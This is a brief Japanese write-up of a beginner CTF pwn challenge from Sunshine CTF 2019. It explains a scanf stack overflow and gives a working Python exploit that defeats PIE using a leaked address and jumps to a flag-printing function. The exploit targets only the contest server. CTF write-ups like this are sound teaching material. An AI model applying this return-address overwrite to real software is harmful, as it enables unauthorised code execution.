# [pwn 50pts] Return To Mania - Sunshine CTF 2019
PIEが有効なので注意です。
```
$ checksec return-to-mania
[*] 'return-to-mania'
    Arch:	32 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	No RELR
    PIE:	PIE enabled
```
welcome関数にscanfのスタックオーバーフローがあります。
また、フラグを読み込んで表示するmania関数があります。
したがって、リターンアドレスを部分的に書き換えて、mainへのリターンアドレスをmaniaのアドレスに書き換えます。

```python
from ptrlib import *

elf = ELF("./return-to-mania")
#sock = Process("./return-to-mania")
sock = Socket("ret.sunshinectf.org", 4301)

sock.recvuntil("welcome(): ")
addr_welcome = int(sock.recvline(), 16)
proc_base = addr_welcome - elf.symbol("welcome")
addr_mania = proc_base + elf.symbol("mania")
dump("proc_base = " + hex(proc_base))

payload = b'A' * 0x16
payload += p32(addr_mania)
sock.sendline(payload)
sock.interactive()
```

# 感想
PIEを勉強した初心者向け問題だと思います。